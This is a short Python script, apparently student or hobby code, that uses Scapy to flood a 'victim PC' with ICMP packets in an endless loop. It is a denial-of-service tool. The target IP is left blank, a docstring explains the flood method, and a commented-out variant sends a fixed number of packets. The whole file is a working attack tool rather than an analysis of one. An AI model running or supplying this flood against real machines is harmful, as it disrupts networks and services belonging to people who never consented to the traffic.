#Extra packages needed for this to run: Scapy.py
from datetime import datetime
from scapy.all import *

TARGET_MACHINE_IP = ""



def ping(victim_ip):
    """
     Ping victim PC performing a ICMP Flood Attack
     The ICMP Flood Attack Aglortihm is based on sending packets 
     as fast as possible without waiting for the victim PCs response 
    """
    time = datetime.now()
    print("[{0}]: Attacker PC pinging victim PC with IP:{1}".format(time.strftime("%H:%M:%S"),TARGET_MACHINE_IP))
    send(IP(dst=victim_ip)/ICMP())

if __name__ == "__main__":
    print("Preparing to ping victim PC")
    while(1):
        ping(TARGET_MACHINE_IP)

    # or we can implementate this ICMP Attack with a different approach
    # we can also make the attacker choose the number of packages
    # to send 
    """ 
        for i in range(0,NUM_OF_PACKAGES):
            ping(TARGET_MACHINE_IP)
    """